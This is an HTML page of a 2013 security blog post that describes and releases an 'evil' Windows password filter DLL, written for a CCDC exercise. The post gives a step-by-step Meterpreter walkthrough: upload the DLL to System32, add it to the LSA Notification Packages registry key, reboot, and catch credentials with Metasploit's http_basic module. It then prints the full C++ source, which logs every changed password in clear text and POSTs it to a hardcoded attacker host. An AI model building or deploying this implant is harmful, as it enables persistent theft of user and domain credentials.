<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Stealing passwords every time they change - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Stealing passwords every time they change" />
<meta property="og:description" content="Password Filters [0] are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy. It is also fairly documented on how to Install and Register Password Filters [1]. Basically what it boils down to is updating a registry key here: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages
with the name of a DLL (without the extension) that you place in Windows\System32\" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2013-09-11T00:28:31-05:00" />
<meta property="article:modified_time" content="2013-09-11T00:28:31-05:00" /><meta property="og:site_name" content="My cool site" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Stealing passwords every time they change"/>
<meta name="twitter:description" content="Password Filters [0] are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy. It is also fairly documented on how to Install and Register Password Filters [1]. Basically what it boils down to is updating a registry key here: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages
with the name of a DLL (without the extension) that you place in Windows\System32\"/>
<meta name="application-name" content="malicious.link">
<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/" /><link rel="prev" href="https://malicious.link/posts/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/" /><link rel="next" href="https://malicious.link/posts/2013/ad-zone-transfers-as-a-user/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Stealing passwords every time they change",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/malicious.link\/posts\/2013\/2013-09-11-stealing-passwords-every-time-they-change\/"
        },"genre": "posts","wordcount":  952 ,
        "url": "https:\/\/malicious.link\/posts\/2013\/2013-09-11-stealing-passwords-every-time-they-change\/","datePublished": "2013-09-11T00:28:31-05:00","dateModified": "2013-09-11T00:28:31-05:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Rob Fuller"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Stealing passwords every time they change</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Rob Fuller</a></span>&nbsp;<span class="post-category">included in <a href="/categories/passwords/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>passwords</a>&nbsp;<a href="/categories/releases/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>releases</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2013-09-11">2013-09-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;952 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
            </div><div class="content" id="content"><p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">Password Filters [0]</a> are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy.  It is also fairly documented on how to Install and <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">Register Password Filters [1]</a>. Basically what it boils down to is updating a registry key here: <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code></p>
<p>with the name of a DLL (without the extension) that you place in Windows\System32\</p>
<p>For <a href="http://www.nationalccdc.org/" target="_blank" rel="noopener noreffer ">National CCDC</a> earlier this year (2013), I created an installer and &ldquo;evil pass filter&rdquo; that basically installed itself as a password filter and any time any passwords changed it would store the change to a log file locally to the victim (in clear text) as well as issue an HTTP basic auth POST to a server I own with the username and password.</p>
<p>The full code can be found below. I&rsquo;ll leave the compiling up to you but basically its slamming the code in Visual Studio, telling it its a DLL, and clicking build for the architecture you are targeting (Make sure to use the Internet Open access settings that make the most sense for the environment you are using this in [<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">2</a>].</p>
<p>So lets walk the exploitation:</p>
<p>First, you have to be admin or system, as this is more of a persistence method than anything.</p>
<pre><code>meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<p>Next, we upload the evilpassfilter.dll to Sytem32:</p>
<pre><code>meterpreter &gt; pwd
C:\Windows\system32
meterpreter &gt; upload /tmp/evilpassfilter.dll .
[*] uploading  : /tmp/evilpassfilter.dll -&gt; .
[*] uploaded   : /tmp/evilpassfilter.dll -&gt; .\evilpassfilter.dll
</code></pre>
<p>Then we need to query what is already in the notification packages list:</p>
<pre><code>meterpreter &gt; reg queryval -k HKLM\\System\\CurrentControlSet\\Control\\Lsa -v &quot;Notification Packages&quot;
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirassfm
</code></pre>
<p>What you can&rsquo;t see here since Metasploit isn&rsquo;t showing the line breaks is that there are two there by default:</p>
<pre><code>scecli
rassfm
</code></pre>
<p>We need to add ours to the end of this list, unfortunately at the current point of time its impossible to do directly from the meterpreter command line (as far as I know). So we need to drop a .reg file and manually import it. Easiest way to do that is to add your &ldquo;evilpassfilter&rdquo; string as well as the ones on the victim to a VM you have and export it. Should look like this:</p>
<p>Once we have our file, we upload and import it using reg command:</p>
<pre><code>meterpreter &gt; upload importme.reg .
[*] uploading  : importme.reg -&gt; .
[*] uploaded   : importme.reg -&gt; .\importme.reg
meterpreter &gt; execute -H -f regedit.exe -a '/s importme.reg'
Process 2628 created.
meterpreter &gt; 
</code></pre>
<p>Double check our work:</p>
<pre><code>meterpreter &gt; reg queryval -k HKLM\\System\\CurrentcontrolSet\\Control\\Lsa -v &quot;Notification Packages&quot;
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirnrassfmrnevilpassfilter 
</code></pre>
<p>Its there, w00t! But it doesn&rsquo;t do anything until a reboot happens :(. Lets just force that to happen (not the most stealthy thing to do):</p>
<pre><code>meterpreter &gt; reboot
Rebooting...
</code></pre>
<p>While thats going on, lets set up the server to catch the basic auth.</p>
<pre><code>msf exploit(psexec) &gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &gt; set URIPATH /
URIPATH =&gt; /
msf auxiliary(http_basic) &gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &gt;
[*] Listening on 0.0.0.0:80...
[*] Using URL: http://0.0.0.0:80/
[*]  Local IP: http://192.168.92.106:80/
[*] Server started.
msf auxiliary(http_basic) &gt; 
</code></pre>
<p>Then we wait for a password to be changed:</p>
<pre><code>msf auxiliary(http_basic) &gt;
[*] 192.168.92.106   http_basic - Sending 401 to client
[+] 192.168.92.106 - Credential collected: &quot;jack:ASDqwe123&quot; =&gt; /
</code></pre>
<p>No matter how complex their password is and without having a shell on the box anymore:</p>
<pre><code>msf auxiliary(http_basic) &gt;
[+] 192.168.92.106 - Credential collected: &quot;jack:a?'z_a4#RRK(mvQEsyQ8l`,JR.pes&lt;;6#0$puQ%Q&amp;,@ZwY(T@p&quot; =&gt; /
</code></pre>
<p>This works from Windows 2000, XP all the way up to Windows 8 &amp; 2012.</p>
<p>Ok, but how often are local password changed? Maybe not that often, but guess what happens when a password filter is put on a domain controller. Every password changed by that DC is &ldquo;verified&rdquo; by your evil password filter.</p>
<p>Oh and what does that log file we talked about earlier on the victim look like if for some reason they block that IP you&rsquo;re getting your authentication to? (You would have to find a way to get back on that system, or make it available via a share or otherwise)</p>
<pre><code>InitializeChangeNotify()
JackJohnson:ASDqwe123
JackJohnson:a?'z_a4#RRK(mvQEsyQ8l`,JR.pes&lt;;6#0$puQ%Q&amp;,@ZwY(T@p
</code></pre>
<p>This attack supports a larger character set than most banks ;-)</p>
<ul>
<li>[0] <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85).aspx</a></li>
<li>[1] <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx</a></li>
<li>[2] <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx" target="_blank" rel="noopener noreffer ">http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx</a></li>
</ul>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;WinInet.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;ntsecapi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">writeToLog</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">szString</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">pFile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">temp</span><span class="se">\\</span><span class="s">logFile.txt&#34;</span><span class="p">,</span> <span class="s">&#34;a+&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">pFile</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">fprintf</span><span class="p">(</span><span class="n">pFile</span><span class="p">,</span> <span class="s">&#34;%s</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">szString</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">fclose</span><span class="p">(</span><span class="n">pFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Default DllMain implementation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                       <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                       <span class="n">LPVOID</span> <span class="n">lpReserved</span>
</span></span><span class="line"><span class="cl">                     <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">OutputDebugString</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;DllMain&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BOOLEAN</span> <span class="kr">__stdcall</span> <span class="nf">InitializeChangeNotify</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">OutputDebugString</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;InitializeChangeNotify&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">writeToLog</span><span class="p">(</span><span class="s">&#34;InitializeChangeNotify()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BOOLEAN</span> <span class="kr">__stdcall</span> <span class="nf">PasswordFilter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">PUNICODE_STRING</span> <span class="n">AccountName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">PUNICODE_STRING</span> <span class="n">FullName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">PUNICODE_STRING</span> <span class="n">Password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOLEAN</span> <span class="n">SetOperation</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">OutputDebugString</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;PasswordFilter&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="kr">__stdcall</span> <span class="nf">PasswordChangeNotify</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">PUNICODE_STRING</span> <span class="n">UserName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">RelativeId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">PUNICODE_STRING</span> <span class="n">NewPassword</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">FILE</span><span class="o">*</span> <span class="n">pFile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">temp</span><span class="se">\\</span><span class="s">logFile.txt&#34;</span><span class="p">,</span> <span class="s">&#34;a+&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//HINTERNET hInternet = InternetOpen(L&#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&#34;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">HINTERNET</span> <span class="n">hInternet</span> <span class="o">=</span> <span class="n">InternetOpen</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&#34;</span><span class="p">,</span><span class="n">INTERNET_OPEN_TYPE_DIRECT</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="n">InternetConnect</span><span class="p">(</span><span class="n">hInternet</span><span class="p">,</span><span class="sa">L</span><span class="s">&#34;172.16.10.1&#34;</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">INTERNET_SERVICE_HTTP</span> <span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">HINTERNET</span> <span class="n">hReq</span> <span class="o">=</span> <span class="n">HttpOpenRequest</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span><span class="sa">L</span><span class="s">&#34;POST&#34;</span><span class="p">,</span><span class="sa">L</span><span class="s">&#34;/&#34;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span><span class="o">*</span> <span class="n">pBuf</span><span class="o">=</span><span class="s">&#34;SomeData&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">OutputDebugString</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;PasswordChangeNotify&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">pFile</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">fprintf</span><span class="p">(</span><span class="n">pFile</span><span class="p">,</span> <span class="s">&#34;%ws:%ws</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserName</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span><span class="n">NewPassword</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">fclose</span><span class="p">(</span><span class="n">pFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">InternetSetOption</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span><span class="n">INTERNET_OPTION_USERNAME</span><span class="p">,</span><span class="n">UserName</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span><span class="n">UserName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">InternetSetOption</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span><span class="n">INTERNET_OPTION_PASSWORD</span><span class="p">,</span><span class="n">NewPassword</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span><span class="n">NewPassword</span><span class="o">-&gt;</span><span class="n">Length</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">HttpSendRequest</span><span class="p">(</span><span class="n">hReq</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">pBuf</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">pBuf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2013-09-11</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/" data-title="Stealing passwords every time they change" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/" data-title="Stealing passwords every time they change"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/" data-title="Stealing passwords every time they change"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/" data-title="Stealing passwords every time they change"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

